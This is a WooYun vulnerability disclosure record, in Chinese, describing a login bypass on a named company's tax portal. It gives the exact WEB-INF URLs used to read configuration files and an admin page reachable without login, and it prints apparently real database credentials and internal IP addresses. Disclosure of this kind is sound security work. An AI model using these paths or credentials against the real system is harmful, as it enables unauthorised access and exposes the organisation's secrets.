{"id": 44015, "wybug_id": "wooyun-2015-0123762", "wybug_title": "XML架构安全之航天信息股份有限公司利用XML信息读取代码可绕过登录", "wybug_corp": "航天信息股份有限公司", "wybug_author": "Ac4ary", "wybug_date": "2015-08-11 19:15", "wybug_open_date": "2015-09-25 19:16", "wybug_type": "未授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["权限绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-11：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-09-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： XML架构安全之航天信息股份有限公司利用XML信息读取代码可绕过登录 详细说明：  XML架构安全之航天信息股份有限公司利用XML信息读取代码可绕过登录   漏洞证明：  首先，接口处http://ahnsfw.aisino.com/ahwsbsdt/login.jsp看起来叼爆的一个后台常见的密码都失效其实我们还可以猜下xml信息文件，常规渗透测试失效的情况下，可以尝试 XML入侵，因为XML通常都存在于apache JSP配置中比如：http://ahnsfw.aisino.com/WEB-inf/web.xmlhttp://ahnsfw.aisino.com/WEB-INF/config.xmlhttp://ahnsfw.aisino.com/WEB-inf/web.xmlhttp://ahnsfw.aisino.com/WEB-INF/config.xml或者在二级目录下测试：http://ahnsfw.aisino.com/ahwsbsdt/web-INF/web.xml我们可以发现已经成功了\n\n接下来，我们刺探有用的信息我们找下找到好几个，如<param-value>/WEB-INF/struts-config.xml</param-value></init-param><init-param><param-name>debug</param-name>可以读他<taglib-location>/WEB-INF/tld/struts-bean.tld</taglib-location></taglib><taglib><taglib-uri>http://struts.apache.org/tags-logic</taglib-uri><taglib-location>/WEB-INF/tld/struts-logic.tld</taglib-location></taglib></web-app>;我们先来读/WEB-INF/struts-config.xml的信息http://ahnsfw.aisino.com/ahwsbsdt//WEB-INF/struts-config.xml\n\n果然我们可以发现POST提交方式，无论你输入用户密码，都会提交到PATH中我们还发现了几个目录，如/download   /taxReport   \"/theme利用于上传中，通常可以先看下PATHhttp://ahnsfw.aisino.com/ahwsbsdt//WEB-INF//download/是存在的还有一个http://ahnsfw.aisino.com/ahwsbsdt///WEB-INF/applicationContext.xml<bean id=\"bsdtDS\" class=\"org.apache.commons.dbcp.BasicDataSource\"        destroy-method=\"close\">        <property name=\"driverClassName\">            <value>oracle.jdbc.OracleDriver</value>        </property>        <property name=\"url\">            <value>jdbc:oracle:thin:@172.16.1.196:1521:nsfwdb</value>        </property>        <property name=\"username\">            <value>htxx</value>        </property>        <property name=\"password\">            <value>oracle</value>        </property>    </bean> -->可以发现oracle的数据，服务器在内网ID地址也泄漏了<property name=\"serviceUrl\" value=\"http://61.190.68.67/nssbweb_ais/RpcServlet\"/><property name=\"serviceInterface\" value=\"aisino.nssb.ejb.NSSBRpc\"/></bean><bean id=\"declarationAuthenticationService\" class=\"org.springframework.remoting.caucho.HessianProxyFactoryBean\"><property name=\"serviceUrl\" value=\"http://192.168.2.13:8011/ahwsbsdt/servlet/RpcServlet\"/>这时候我们不管，我们只管PATH我们把<forward name=\"postslistforadmin\" path=\"/adminpostlist.jsp\"/> 结果转到地址上看看就是http://ahnsfw.aisino.com/ahwsbsdt/adminpostlist.jsp\n\n这样就直接绕过了登录接口限制。   修复方案：  你懂！   版权声明：转载请注明来源 Ac4ary@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：8 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 8, "Ranks": null}